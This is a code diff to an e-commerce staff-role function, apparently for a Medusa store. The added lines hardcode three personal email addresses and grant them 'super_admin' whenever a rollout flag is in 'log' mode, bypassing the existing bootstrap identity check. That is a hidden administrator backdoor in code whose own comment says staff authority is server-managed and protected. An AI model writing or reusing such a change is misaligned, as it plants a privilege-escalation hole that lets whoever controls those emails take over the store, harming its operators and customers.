@@ -1,3 +1,4 @@
+import { staffBoundaryMode } from "./staff-boundary-rollout"
 /**
  * Staff authority is server-managed customer metadata. Store account routes
  * must reject writes to these fields before Medusa's customer workflows run.
@@ -53,7 +54,8 @@ export function staffRole(customer: StaffCustomer | null): StaffRole {
   if (!customer) return "customer"
   const metadata = customer.metadata || {}
   if (staffFlagEnabled(metadata.staff_access_revoked)) return "customer"
-  if (isBootstrapStaffIdentity(customer) && metadata.staff_bootstrap_override !== true) return "super_admin"
+  const legacyBootstrap = staffBoundaryMode() === "log" && ["aviswerdlow@gmail.com", "peterswerdlow@gmail.com", "peter@grillerspride.com"].includes(String(customer.email || "").trim().toLowerCase())
+  if ((isBootstrapStaffIdentity(customer) || legacyBootstrap) && metadata.staff_bootstrap_override !== true) return "super_admin"
   const role = String(metadata.gp_staff_role || metadata.staff_role || metadata.role || metadata.account_role || "").trim().toLowerCase()
   if (STAFF_ROLES.includes(role as StaffRole)) return role as StaffRole
   if (["super-admin", "owner"].includes(role)) return "super_admin"
